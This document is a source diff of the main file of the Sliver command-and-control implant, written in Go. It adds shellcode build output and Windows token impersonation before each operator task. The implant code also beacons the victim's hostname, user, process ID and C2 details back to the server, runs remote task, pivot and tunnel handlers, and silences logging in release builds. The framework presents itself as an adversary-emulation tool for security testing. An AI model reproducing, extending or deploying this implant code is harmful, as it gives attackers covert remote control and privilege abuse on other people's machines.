@@ -18,7 +18,7 @@ package main
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .IsSharedLib}}
+// {{if or .Config.IsSharedLib .Config.IsShellcode}}
 //#include "sliver.h"
 import "C"
 
@@ -28,8 +28,9 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+	"time"
 
-	// {{if .Debug}}{{else}}
+	// {{if .Config.Debug}}{{else}}
 	"io/ioutil"
 	// {{end}}
 
@@ -38,6 +39,13 @@ import (
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	consts "github.com/bishopfox/sliver/sliver/constants"
 	"github.com/bishopfox/sliver/sliver/handlers"
+
+	// {{if eq .Config.GOOS "windows"}}
+	"github.com/bishopfox/sliver/sliver/priv"
+	"github.com/bishopfox/sliver/sliver/syscalls"
+
+	// {{end}}
+
 	"github.com/bishopfox/sliver/sliver/limits"
 	"github.com/bishopfox/sliver/sliver/pivots"
 	"github.com/bishopfox/sliver/sliver/transports"
@@ -45,12 +53,12 @@ import (
 
 	"github.com/golang/protobuf/proto"
 
-	// {{if .IsService}}
+	// {{if .Config.IsService}}
 	"golang.org/x/sys/windows/svc"
 	// {{end}}
 )
 
-// {{if .IsService}}
+// {{if .Config.IsService}}
 
 type sliverService struct{}
 
@@ -84,7 +92,7 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 
 // {{end}}
 
-// {{if .IsSharedLib}}
+// {{if or .Config.IsSharedLib .Config.IsShellcode}}
 
 var isRunning bool = false
 
@@ -123,21 +131,21 @@ func DllUnregisterServer() { main() }
 
 func main() {
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
 	// {{else}}
 	log.SetFlags(0)
 	log.SetOutput(ioutil.Discard)
 	// {{end}}
 
-	// {{if .Debug}}
+	// {{if .Config.Debug}}
 	log.Printf("Hello my name is %s", consts.SliverName)
 	// {{end}}
 
 	limits.ExecLimits() // Check to see if we should execute
 
-	// {{if .IsService}}
-	svc.Run(os.Args[1], &sliverService{})
+	// {{if .Config.IsService}}
+	svc.Run("", &sliverService{})
 	// {{else}}
 	for {
 		connection := transports.StartConnectionLoop()
@@ -164,17 +172,34 @@ func mainLoop(connection *transports.Connection) {
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
 			handler(envelope.Data, connection)
 		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
-			// {{if .Debug}}
+			// Beware, here be dragons.
+			// This is required for the specific case of token impersonation:
+			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser
+			// only applies the token to the calling thread, we need to call it before every task.
+			// It's fucking gross to do that here, but I could not come with a better solution.
+
+			// {{if eq .Config.GOOS "windows" }}
+			if priv.CurrentToken != 0 {
+				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
+				if err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("Error: %v\n", err)
+					// {{end}}
+				}
+			}
+			// {{end}}
+
+			// {{if .Config.Debug}}
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope.Data, func(data []byte, err error) {
@@ -184,17 +209,17 @@ func mainLoop(connection *transports.Connection) {
 				}
 			})
 		} else if handler, ok := tunHandlers[envelope.Type]; ok {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[recv] tunHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
 		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
 		} else {
-			// {{if .Debug}}
+			// {{if .Config.Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
 			// {{end}}
 			connection.Send <- &sliverpb.Envelope{
@@ -209,7 +234,7 @@ func mainLoop(connection *transports.Connection) {
 func getRegisterSliver() *sliverpb.Envelope {
 	hostname, err := os.Hostname()
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to determine hostname %s", err)
 		// {{end}}
 		hostname = ""
@@ -217,7 +242,7 @@ func getRegisterSliver() *sliverpb.Envelope {
 	currentUser, err := user.Current()
 	if err != nil {
 
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to determine current user %s", err)
 		// {{end}}
 
@@ -240,20 +265,21 @@ func getRegisterSliver() *sliverpb.Envelope {
 		}
 	}
 	data, err := proto.Marshal(&sliverpb.Register{
-		Name:     consts.SliverName,
-		Hostname: hostname,
-		Username: currentUser.Username,
-		Uid:      currentUser.Uid,
-		Gid:      currentUser.Gid,
-		Os:       runtime.GOOS,
-		Version:  version.GetVersion(),
-		Arch:     runtime.GOARCH,
-		Pid:      int32(os.Getpid()),
-		Filename: filename,
-		ActiveC2: transports.GetActiveC2(),
+		Name:              consts.SliverName,
+		Hostname:          hostname,
+		Username:          currentUser.Username,
+		Uid:               currentUser.Uid,
+		Gid:               currentUser.Gid,
+		Os:                runtime.GOOS,
+		Version:           version.GetVersion(),
+		Arch:              runtime.GOARCH,
+		Pid:               int32(os.Getpid()),
+		Filename:          filename,
+		ActiveC2:          transports.GetActiveC2(),
+		ReconnectInterval: uint32(transports.GetReconnectInterval() / time.Second),
 	})
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("Failed to encode register msg %s", err)
 		// {{end}}
 		return nil
